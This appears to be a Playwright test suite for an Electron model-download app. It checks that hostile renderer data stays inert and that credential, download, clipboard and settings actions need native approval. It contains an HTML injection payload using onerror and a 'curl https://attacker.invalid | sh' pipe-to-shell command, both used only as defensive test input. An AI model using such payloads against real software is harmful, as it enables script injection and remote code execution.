import { test, expect, _electron as electron } from '@playwright/test';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { acceptBetaTerms } from './consent-helper.js';

let app, page, home;
const errors = [];
const attack = 'hostile \"><img id="renderer-xss" src="x" onerror="globalThis.rendererXss=true">';

test.beforeAll(async () => {
  home = fs.mkdtempSync(path.join(os.tmpdir(), 'fb-renderer-trust-'));
  fs.writeFileSync(path.join(home, 'settings.json'), JSON.stringify({
    downloadDir: path.join(home, 'downloads'), dhtEnabled: false, upnpEnabled: false,
    confirmBigPull: false, confirmExitSeeding: false,
  }));
  fs.writeFileSync(path.join(home, 'state.json'), JSON.stringify({
    userCatalog: [], library: [], downloadedItems: [], transfers: [], hfDownloads: [], hiddenCatalog: [], completionMoves: [],
    hfTokenEnc: 'QUJDRA==', hfTokenMigrationRequired: false, hfUser: 'saved-account', hfRole: 'read',
    devices: [{ id: 'saved-device', host: 'fixture-spark', name: 'Saved Spark', generation: 'fixture-generation',
      profile: { mode: 'ssh', host: 'fixture-spark' }, createdAt: 1 }],
    selectedDeviceId: 'saved-device',
  }));
  app = await electron.launch({
    executablePath: process.env.FROSTBYTE_EXECUTABLE,
    args: process.env.FROSTBYTE_EXECUTABLE ? [] : ['.'],
    env: { ...process.env, FROSTBYTE_HOME: home },
  });
  page = await app.firstWindow();
  await acceptBetaTerms(page, app);
  page.on('pageerror', error => errors.push(error.message));
  const base = (await page.evaluate(() => window.frostbyte.getState())).data;
  await app.evaluate(({ ipcMain }, { base, attack }) => {
    const root = '/models';
    const status = {
      version: '0.2.0-beta.99', hostname: attack, architecture: attack, memoryBytes: 1024,
      downloadDir: root, storageRoots: [root], storage: [{ path: root, available: true, freeBytes: 1024, totalBytes: 2048 }],
      hardware: { platform: 'linux', name: attack, modelIdentifier: attack, chip: attack, gpus: [{ name: attack }] },
      inventoryControls: true, inventory: [{ id: 'remote-item', source: 'torrent', kind: 'torrent', name: attack,
        path: `${root}/${attack}`, destination: root, relative: attack, directory: true, fileCount: 1, size: 12, available: true, files: [] }],
      torrents: [{ infoHash: 'b'.repeat(40), name: attack, length: 12, downloaded: 6, uploaded: 0, downloadSpeed: 1,
        uploadSpeed: 0, progress: .5, ratio: 0, timeRemaining: 1000, done: false, seeding: false, paused: false,
        numPeers: 1, ready: true, path: root, destination: root, files: [{ name: attack, path: attack, length: 12, progress: .5 }],
        peers: [{ addr: attack }] }],
      downloads: [{ id: 'remote-hf', repoId: 'owner/remote', revision: 'a'.repeat(40), filePath: `${attack}.json`,
        destination: root, dest: `${root}/owner/remote/${attack}.json`, total: 12, downloaded: 4, speedBps: 1,
        etaMs: 1000, status: 'active', error: attack }],
    };
    const device = { id: 'fixture-device', host: attack, name: attack, label: attack, connected: true, defaultDir: root, status };
    const state = globalThis.rendererTrustFixture = {
      ...base,
      stats: { ...base.stats, upnpMapped: null, upnpCleanupPending: 4569 },
      settings: { ...base.settings, sparkHost: attack, sparkDownloadHost: attack, sparkDownloadDir: root },
      selectedDeviceId: device.id,
      devices: [device],
      catalog: [{ id: 'hostile-catalog', name: attack, publisher: attack, params: attack, quant: attack, format: attack,
        sizeBytes: 12, license: attack, magnet: `magnet:?xt=urn:btih:${'c'.repeat(40)}`, infohash: 'c'.repeat(40),
        tags: [attack], notes: attack, source: 'remote' }],
      torrents: [{ infoHash: 'd'.repeat(40), magnetURI: `magnet:?xt=urn:btih:${'d'.repeat(40)}`, name: attack,
        length: 12, downloaded: 6, uploaded: 0, downloadSpeed: 1, uploadSpeed: 0, progress: .5, ratio: 0,
        timeRemaining: 1000, done: false, seeding: false, paused: false, numPeers: 1, ready: true,
        path: `${base.settings.downloadDir}/${attack}`, destination: base.settings.downloadDir,
        files: [{ name: attack, path: attack, length: 12, progress: .5 }], peers: [{ addr: attack }] }],
      downloads: [{ id: 'local-hf', repoId: 'owner/local', revision: 'a'.repeat(40), filePath: `${attack}.json`,
        baseDir: base.settings.downloadDir, dest: `${base.settings.downloadDir}/owner/local/${attack}.json`,
        total: 12, downloaded: 4, speedBps: 1, etaMs: 1000, status: 'active', error: attack }],
      inventory: [],
    };
    for (const channel of ['app:state', 'devices:status', 'devices:select', 'spark:device-telemetry', 'spark:device-recipes', 'spark:files', 'hf:search', 'hf:model', 'hf:refs']) ipcMain.removeHandler(channel);
    ipcMain.handle('app:state', () => ({ ok: true, data: state }));
    ipcMain.handle('devices:status', () => ({ ok: true, data: state.devices }));
    ipcMain.handle('devices:select', (_, id) => id === device.id ? { ok: true, data: state } : { ok: false, error: 'Unknown fixture device' });
    ipcMain.handle('spark:device-telemetry', () => ({ ok: true, data: { schema: 1, docker: { available: true, containers: [{ name: attack, state: attack }] } } }));
    ipcMain.handle('spark:device-recipes', () => ({ ok: true, data: [] }));
    ipcMain.handle('spark:files', () => ({ ok: true, data: { root, relative: '', truncated: false,
      entries: [{ name: attack, relative: attack, directory: false, size: 12 }] } }));
    ipcMain.handle('hf:search', () => ({ ok: true, data: { models: [{ id: 'owner/model', downloads: 1, likes: 2,
      license: attack, pipelineTag: attack, gated: false, lastModified: '2026-01-01T00:00:00Z' }], cursor: null } }));
    ipcMain.handle('hf:model', () => ({ ok: true, data: { id: 'owner/model', sha: 'a'.repeat(40), gated: false,
      license: attack, files: [{ path: `${attack}.json`, size: 12 }] } }));
    ipcMain.handle('hf:refs', () => ({ ok: true, data: [{ name: attack, type: attack }] }));
  }, { base, attack });
  await page.reload();
  await page.waitForFunction(() => document.querySelector('#nav .nav.on'));
});

test.afterAll(async () => {
  await app?.close();
  if (home) fs.rmSync(home, { recursive: true, force: true });
});

test('hostile catalog, torrent, Hub, and device text stays inert across interactive views', async () => {
  await page.locator('#nav [data-tab="transfers"]').click();
  const torrent = page.locator(`#transfers .tor[data-hash="${'d'.repeat(40)}"]`);
  await expect(torrent.locator('.tor-name')).toHaveText(attack);
  await torrent.locator('[data-toggle-files]').click();
  await expect(torrent.locator('.fname').first()).toContainText(attack);

  await page.locator('#nav [data-tab="catalog"]').click();
  await page.locator('#saved-links summary').click();
  await expect(page.locator('#grid-catalog .nm')).toHaveText(attack);
  await page.locator('#grid-catalog tbody tr').click();
  await expect(page.locator('#drawer h3')).toHaveText(attack);
  await expect(page.locator('#drawer')).toContainText(attack);

  await page.locator('#nav [data-tab="hf"]').click();
  await page.locator('#hf-q').fill('model');
  await page.locator('#hf-go').click();
  await expect(page.locator('#grid-hf tbody tr')).toContainText(attack);
  await page.locator('#grid-hf tbody tr').click();
  await expect(page.locator('#hf-detail')).toContainText(attack);

  await page.locator('#nav [data-tab="spark"]').click();
  await expect(page.locator('[data-select-device="fixture-device"]')).toContainText(attack);
  await page.locator('[data-select-device="fixture-device"]').click();
  await page.locator('#spark-files-section summary').click();
  await expect(page.locator('#spark-files')).toContainText(attack);

  await expect(page.locator('#renderer-xss')).toHaveCount(0);
  expect(await page.evaluate(() => globalThis.rendererXss === true)).toBe(false);
  expect(errors).toEqual([]);
});

test('an uncertain router rule is shown as cleanup pending rather than mapped', async () => {
  await expect(page.locator('#con-upnp')).toHaveText('cleanup pending (4569)');
});

test('a hostile renderer cannot contact an arbitrary catalog without exact native approval', async () => {
  await app.evaluate(({ dialog }) => {
    globalThis.catalogReview = null;
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') }; globalThis.catalogReview = structuredClone(options); return { response: 0 }; };
  });
  const url = `https://catalog.invalid/models.json?private=${encodeURIComponent('/Users/person/private-model')}`;
  const result = await page.evaluate(value => window.frostbyte.importCatalogUrl(value), url);
  expect(result).toEqual({ ok: true, data: { cancelled: true } });
  const review = await app.evaluate(() => globalThis.catalogReview);
  expect(review.defaultId).toBe(0); expect(review.cancelId).toBe(0);
  expect(review.detail).toContain(JSON.stringify(new URL(url).href));
});

test('an approved catalog URL cannot redirect to an unreviewed public HTTPS origin', async () => {
  const reviewed = 'https://8.8.8.8/reviewed.json';
  const unreviewed = 'https://1.1.1.1/unreviewed.json';
  await app.evaluate(({ dialog }, { unreviewed }) => {
    const https = process.getBuiltinModule('node:https');
    const { EventEmitter } = process.getBuiltinModule('node:events');
    globalThis.catalogRedirectOriginalRequest = https.request;
    globalThis.catalogRedirectCalls = [];
    globalThis.catalogRedirectResponseDestroyed = false;
    globalThis.catalogRedirectReview = null;
    https.request = (url, _options, onResponse) => {
      globalThis.catalogRedirectCalls.push(url.href);
      const request = new EventEmitter();
      request.destroy = error => { if (error) request.emit('error', error); };
      request.end = () => {
        const response = new EventEmitter();
        response.statusCode = 302;
        response.headers = { location: unreviewed };
        response.destroy = () => { globalThis.catalogRedirectResponseDestroyed = true; };
        queueMicrotask(() => onResponse(response));
      };
      return request;
    };
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      globalThis.catalogRedirectReview = structuredClone(options);
      return { response: 1 };
    };
  }, { unreviewed });

  let result;
  try {
    result = await page.evaluate(value => window.frostbyte.importCatalogUrl(value), reviewed);
  } finally {
    await app.evaluate(() => {
      const https = process.getBuiltinModule('node:https');
      https.request = globalThis.catalogRedirectOriginalRequest;
      delete globalThis.catalogRedirectOriginalRequest;
    });
  }

  expect(result.ok).toBe(false);
  expect(result.error).toMatch(/redirects are not allowed.*final HTTPS URL.*reviewed/i);
  const evidence = await app.evaluate(() => ({
    calls: globalThis.catalogRedirectCalls,
    responseDestroyed: globalThis.catalogRedirectResponseDestroyed,
    review: globalThis.catalogRedirectReview,
  }));
  expect(evidence.calls).toEqual([reviewed]);
  expect(evidence.responseDestroyed).toBe(true);
  expect(evidence.review.detail).toContain(JSON.stringify(reviewed));
  expect(JSON.parse(fs.readFileSync(path.join(home, 'state.json'), 'utf8')).userCatalog).toEqual([]);
});

test('a hostile renderer cannot emit or persist an arbitrary torrent identity without native approval', async () => {
  await app.evaluate(({ dialog }) => {
    globalThis.torrentBoundaryReviews = [];
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      globalThis.torrentBoundaryReviews.push(structuredClone(options));
      return { response: 0 };
    };
  });
  const infoHash = 'e'.repeat(40);
  const inspected = await page.evaluate(hash => window.frostbyte.inspectTorrent(hash, 'hostile-preview'), infoHash);
  expect(inspected).toEqual({ ok: true, data: { cancelled: true } });
  const added = await page.evaluate(hash => window.frostbyte.add(hash), infoHash);
  expect(added.ok).toBe(true); expect(added.data.cancelled).toBe(true);
  const catalog = await page.evaluate(hash => window.frostbyte.addCatalogEntry({ name: 'covert identity', infohash: hash }), infoHash);
  expect(catalog.ok).toBe(true); expect(catalog.data.cancelled).toBe(true);

  const reviews = await app.evaluate(() => globalThis.torrentBoundaryReviews);
  expect(reviews).toHaveLength(3);
  for (const review of reviews) {
    expect(review.defaultId).toBe(0); expect(review.cancelId).toBe(0);
    expect(review.detail).toContain(JSON.stringify(infoHash));
  }
  expect(reviews[0].buttons[1]).toBe('Contact peers');
  expect(reviews[1].buttons[1]).toBe('Start download');
  expect(reviews[2].buttons[1]).toBe('Save source');
});

test('torrent metadata approval cannot be reused to start a download', async () => {
  await app.evaluate(({ dialog }) => {
    globalThis.scopedTorrentReviews = [];
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      globalThis.scopedTorrentReviews.push(structuredClone(options));
      return { response: globalThis.scopedTorrentReviews.length === 1 ? 1 : 0 };
    };
  });
  const infoHash = 'f'.repeat(40);
  await page.evaluate(async hash => {
    const id = 'scoped-preview';
    const pending = window.frostbyte.inspectTorrent(hash, id);
    setTimeout(() => window.frostbyte.cancelInspect(id), 25);
    return pending;
  }, infoHash);
  const added = await page.evaluate(hash => window.frostbyte.add(hash), infoHash);
  expect(added.ok).toBe(true); expect(added.data.cancelled).toBe(true);
  const reviews = await app.evaluate(() => globalThis.scopedTorrentReviews);
  expect(reviews).toHaveLength(2);
  expect(reviews[0].buttons[1]).toBe('Contact peers');
  expect(reviews[1].buttons[1]).toBe('Start download');
  for (const review of reviews) expect(review.detail).toContain(JSON.stringify(infoHash));
});

test('a renderer-created file object cannot grant local torrent access without native review', async () => {
  const privateTorrent = path.join(home, 'private-layout.torrent');
  fs.writeFileSync(privateTorrent, 'this must not be parsed after cancellation');
  await app.evaluate(({ dialog }) => {
    globalThis.localTorrentReview = null;
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      globalThis.localTorrentReview = structuredClone(options);
      return { response: 0 };
    };
  });
  await page.evaluate(() => { const input = document.createElement('input'); input.type = 'file'; input.id = 'private-torrent-input'; document.body.append(input); });
  await page.locator('#private-torrent-input').setInputFiles(privateTorrent);
  const result = await page.locator('#private-torrent-input').evaluate(input => window.frostbyte.droppedFilePath(input.files[0]));
  expect(result).toBeNull();
  const review = await app.evaluate(() => globalThis.localTorrentReview);
  expect(review.defaultId).toBe(0); expect(review.cancelId).toBe(0);
  expect(review.detail).toContain(JSON.stringify(privateTorrent));
  await page.locator('#private-torrent-input').evaluate(input => input.remove());
});

test('a hostile renderer cannot revoke device access or clear credentials without native approval', async () => {
  await app.evaluate(({ dialog }) => {
    globalThis.destructiveBoundaryReviews = [];
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      globalThis.destructiveBoundaryReviews.push(structuredClone(options));
      return { response: 0 };
    };
  });
  const before = JSON.parse(fs.readFileSync(path.join(home, 'state.json'), 'utf8'));
  const forgotten = await page.evaluate(() => window.frostbyte.forgetDevice('saved-device'));
  expect(forgotten.ok).toBe(true); expect(forgotten.data.cancelled).toBe(true);
  const cleared = await page.evaluate(() => window.frostbyte.hfSetToken(''));
  expect(cleared).toEqual({ ok: true, data: { cleared: false, cancelled: true } });
  const after = JSON.parse(fs.readFileSync(path.join(home, 'state.json'), 'utf8'));
  expect(after.devices).toEqual(before.devices);
  expect(after.hfTokenEnc).toBe(before.hfTokenEnc);
  expect(after.hfUser).toBe('saved-account');

  const reviews = await app.evaluate(() => globalThis.destructiveBoundaryReviews);
  expect(reviews).toHaveLength(2);
  for (const review of reviews) { expect(review.defaultId).toBe(0); expect(review.cancelId).toBe(0); }
  expect(reviews[0].detail).toContain(JSON.stringify('Saved Spark'));
  expect(reviews[0].detail).toContain(JSON.stringify('fixture-spark'));
  expect(reviews[1].detail).toContain(JSON.stringify('saved-account'));
});

test('a hostile renderer cannot accept notices without native approval or enable data collection', async () => {
  await app.evaluate(({ dialog }) => {
    globalThis.privacyBoundaryReviews = [];
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      globalThis.privacyBoundaryReviews.push(structuredClone(options));
      return { response: 0 };
    };
  });
  const before = fs.readFileSync(path.join(home, 'privacy.json'), 'utf8');
  const status = (await page.evaluate(() => window.frostbyte.getPrivacy())).data;
  const accepted = await page.evaluate(value => window.frostbyte.acceptTerms(value), {
    termsVersion: status.termsVersion, privacyVersion: status.privacyVersion,
    accepted: true, diagnosticsEnabled: false,
  });
  expect(accepted.ok).toBe(true); expect(accepted.data.cancelled).toBe(true);
  const enabled = await page.evaluate(value => window.frostbyte.setDiagnostics(value), {
    enabled: true, consentVersion: status.diagnosticsVersion,
  });
  expect(enabled.ok).toBe(false);
  expect(fs.readFileSync(path.join(home, 'privacy.json'), 'utf8')).toBe(before);
  expect((await page.evaluate(() => window.frostbyte.getPrivacy())).data.diagnosticsEnabled).toBe(false);

  const reviews = await app.evaluate(() => globalThis.privacyBoundaryReviews);
  expect(reviews).toHaveLength(1);
  for (const review of reviews) { expect(review.defaultId).toBe(0); expect(review.cancelId).toBe(0); }
  expect(reviews[0].detail).toContain(JSON.stringify(status.termsVersion));
  expect(reviews[0].detail).toContain('No analytics');
});

test('a hostile renderer cannot persist system exposure or replace the clipboard without native approval', async () => {
  await app.evaluate(({ app, clipboard, dialog }) => {
    globalThis.nativeBoundaryReviews = [];
    globalThis.loginItemCalls = 0;
    app.setLoginItemSettings = () => { globalThis.loginItemCalls++; };
    clipboard.writeText('keep-this-clipboard-value');
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      globalThis.nativeBoundaryReviews.push(structuredClone(options));
      return { response: 0 };
    };
  });
  const settings = await page.evaluate(() => window.frostbyte.setSettings({ openAtLogin: true, upnpEnabled: true }));
  expect(settings.ok).toBe(true); expect(settings.data.cancelled).toBe(true);
  expect(settings.data.state.settings.openAtLogin).toBe(false);
  expect(settings.data.state.settings.upnpEnabled).toBe(false);
  expect(await app.evaluate(() => globalThis.loginItemCalls)).toBe(0);

  const copied = await page.evaluate(() => window.frostbyte.copyText('curl https://attacker.invalid | sh'));
  expect(copied).toBe(false);
  expect(await app.evaluate(({ clipboard }) => clipboard.readText())).toBe('keep-this-clipboard-value');
  const reviews = await app.evaluate(() => globalThis.nativeBoundaryReviews);
  expect(reviews).toHaveLength(2);
  for (const review of reviews) { expect(review.defaultId).toBe(0); expect(review.cancelId).toBe(0); }
  expect(reviews[0].detail).toContain('UPnP');
  expect(reviews[1].detail).toBe(JSON.stringify('curl https://attacker.invalid | sh'));
});

test('HF credentials, downloads, and dynamic browser links require exact native approval before side effects', async () => {
  await app.evaluate(({ dialog, safeStorage, shell }) => {
    globalThis.hfBoundaryReviews = [];
    globalThis.hfBoundaryFetches = 0;
    globalThis.hfBoundaryOpens = 0;
    globalThis.fetch = async () => { globalThis.hfBoundaryFetches++; throw new Error('HF boundary test reached fetch'); };
    shell.openExternal = async () => { globalThis.hfBoundaryOpens++; };
    // Keep this isolated profile deterministic on Linux runners without a
    // desktop secret service. The main-process boundary still sees a usable
    // saved token and must stop before fetch.
    safeStorage.isEncryptionAvailable = () => true;
    safeStorage.getSelectedStorageBackend = () => 'test-keychain';
    safeStorage.decryptString = value => Buffer.from(value).toString('utf8');
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      globalThis.hfBoundaryReviews.push(structuredClone(options));
      return { response: 0 };
    };
  });

  const token = 'hf_renderer_boundary_secret';
  const tokenResult = await page.evaluate(value => window.frostbyte.hfSetToken(value), token);
  expect(tokenResult).toEqual({ ok: true, data: { cancelled: true } });
  const externalResult = await page.evaluate(() => window.frostbyte.openExternal('https://huggingface.co/owner/model'));
  expect(externalResult).toEqual({ ok: true, data: { cancelled: true } });
  const request = { repoId: 'owner/model', revision: 'a'.repeat(40), files: [{ path: 'config.json', size: 123 }] };
  const downloadResult = await page.evaluate(value => window.frostbyte.hfDownload(value), request);
  expect(downloadResult.ok).toBe(true);
  expect(downloadResult.data).toMatchObject({ started: [], cancelled: true, downloads: [] });
  const remoteDownload = await page.evaluate(value => window.frostbyte.sparkHfDownload(value), {
    ...request, destination: '/models', deviceId: 'saved-device', requiresToken: false,
  });
  expect(remoteDownload).toEqual({ ok: true, data: { cancelled: true } });
  expect(await app.evaluate(() => ({ fetches: globalThis.hfBoundaryFetches, opens: globalThis.hfBoundaryOpens })))
    .toEqual({ fetches: 0, opens: 0 });
  expect(JSON.parse(fs.readFileSync(path.join(home, 'state.json'), 'utf8')).hfDownloads).toEqual([]);
  const reviews = await app.evaluate(() => globalThis.hfBoundaryReviews);
  expect(reviews).toHaveLength(4);
  for (const review of reviews) { expect(review.defaultId).toBe(0); expect(review.cancelId).toBe(0); }
  expect(reviews[0].detail).toContain(JSON.stringify('https://huggingface.co/api/whoami-v2'));
  expect(reviews[0].detail).toContain(`${Buffer.byteLength(token)} UTF-8 bytes`);
  expect(reviews[0].detail).toContain(JSON.stringify(crypto.createHash('sha256').update(token).digest('hex')));
  expect(reviews[0].detail).not.toContain(token);
  expect(reviews[1].detail).toContain(JSON.stringify('https://huggingface.co/owner/model'));
  for (const value of ['owner/model', 'a'.repeat(40), path.resolve(home, 'downloads')]) {
    expect(reviews[2].detail).toContain(JSON.stringify(value));
  }
  expect(reviews[2].detail).toContain('Files: 1');
  expect(reviews[2].detail).toMatch(/Normalized manifest SHA-256: "[a-f0-9]{64}"/);
  for (const value of ['Saved Spark', 'owner/model', 'a'.repeat(40), '/models']) {
    expect(reviews[3].detail).toContain(JSON.stringify(value));
  }
  expect(reviews[3].detail).toContain('Credential sent to device: NO');

  // Replacing a saved device record while its exact remote-download review is
  // open invalidates that review before any companion request can be sent.
  await app.evaluate(({ dialog }) => {
    globalThis.pendingRemoteDeviceReview = null;
    globalThis.releaseRemoteDeviceReview = null;
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      if (options?.message === 'Download to this device?') {
        globalThis.pendingRemoteDeviceReview = structuredClone(options);
        return new Promise(resolve => { globalThis.releaseRemoteDeviceReview = resolve; });
      }
      return { response: 0 };
    };
  });
  const staleRemote = page.evaluate(value => window.frostbyte.sparkHfDownload(value), {
    ...request, destination: '/models', deviceId: 'saved-device', requiresToken: false,
  });
  await expect.poll(() => app.evaluate(() => Boolean(globalThis.pendingRemoteDeviceReview))).toBe(true);
  const configured = await page.evaluate(() => window.frostbyte.configureDevice('saved-device', { name: 'Changed during review' }));
  expect(configured.ok, configured.error).toBe(true);
  await app.evaluate(() => globalThis.releaseRemoteDeviceReview({ response: 1 }));
  const staleRemoteResult = await staleRemote;
  expect(staleRemoteResult.ok).toBe(false);
  expect(staleRemoteResult.error).toContain('saved device or Hugging Face download changed');
  expect(JSON.parse(fs.readFileSync(path.join(home, 'state.json'), 'utf8')).devices[0].name).toBe('Changed during review');

  // Replace the saved credential while an approving download review is open.
  // The first request must recheck its exact credential snapshot before queueing.
  await app.evaluate(({ dialog }) => {
    globalThis.pendingDownloadReview = null;
    globalThis.releaseDownloadReview = null;
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      if (options?.message === 'Start this Hugging Face download?') {
        globalThis.pendingDownloadReview = structuredClone(options);
        return new Promise(resolve => { globalThis.releaseDownloadReview = resolve; });
      }
      if (options?.message === 'Remove the saved Hugging Face token?') return { response: 1 };
      return { response: 0 };
    };
  });
  const pending = page.evaluate(value => window.frostbyte.hfDownload(value), {
    ...request, files: [{ path: 'replacement-check.json', size: 55 }],
  });
  await expect.poll(() => app.evaluate(() => Boolean(globalThis.pendingDownloadReview))).toBe(true);
  const cleared = await page.evaluate(() => window.frostbyte.hfSetToken(''));
  expect(cleared).toEqual({ ok: true, data: { cleared: true, cancelled: false } });
  await app.evaluate(() => globalThis.releaseDownloadReview({ response: 1 }));
  const replaced = await pending;
  expect(replaced.ok).toBe(false);
  expect(replaced.error).toContain('credential changed during download review');
  expect(await app.evaluate(() => globalThis.hfBoundaryFetches)).toBe(0);
  expect(JSON.parse(fs.readFileSync(path.join(home, 'state.json'), 'utf8')).hfDownloads).toEqual([]);

  // Two dialogs may be open concurrently, but only the first request may
  // publish the queue snapshot it reviewed. The stale second snapshot fails.
  await app.evaluate(({ dialog }) => {
    globalThis.concurrentDownloadReviews = [];
    globalThis.concurrentDownloadReleases = [];
    dialog.showMessageBox = async (_window, options) => {
      if (options?.buttons?.includes('Details…')) return { response: options.buttons.indexOf('Details…') };
      if (options?.message !== 'Start this Hugging Face download?') return { response: 0 };
      globalThis.concurrentDownloadReviews.push(structuredClone(options));
      return new Promise(resolve => { globalThis.concurrentDownloadReleases.push(resolve); });
    };
  });
  const firstPending = page.evaluate(value => window.frostbyte.hfDownload(value), {
    ...request, files: [{ path: 'race-first.json', size: 10 }],
  });
  const secondPending = page.evaluate(value => window.frostbyte.hfDownload(value), {
    ...request, files: [{ path: 'race-second.json', size: 11 }],
  });
  await expect.poll(() => app.evaluate(() => globalThis.concurrentDownloadReleases.length)).toBe(2);
  await app.evaluate(() => globalThis.concurrentDownloadReleases[0]({ response: 1 }));
  const firstAccepted = await firstPending;
  expect(firstAccepted.ok, firstAccepted.error).toBe(true);
  await app.evaluate(() => globalThis.concurrentDownloadReleases[1]({ response: 1 }));
  const staleSecond = await secondPending;
  expect(staleSecond.ok).toBe(false);
  expect(staleSecond.error).toContain('queue changed during download review');
  await expect.poll(() => JSON.parse(fs.readFileSync(path.join(home, 'state.json'), 'utf8')).hfDownloads[0]?.status).toBe('error');
  const durableQueue = JSON.parse(fs.readFileSync(path.join(home, 'state.json'), 'utf8')).hfDownloads;
  expect(durableQueue).toHaveLength(1);
  expect(durableQueue[0].filePath).toBe('race-first.json');
});
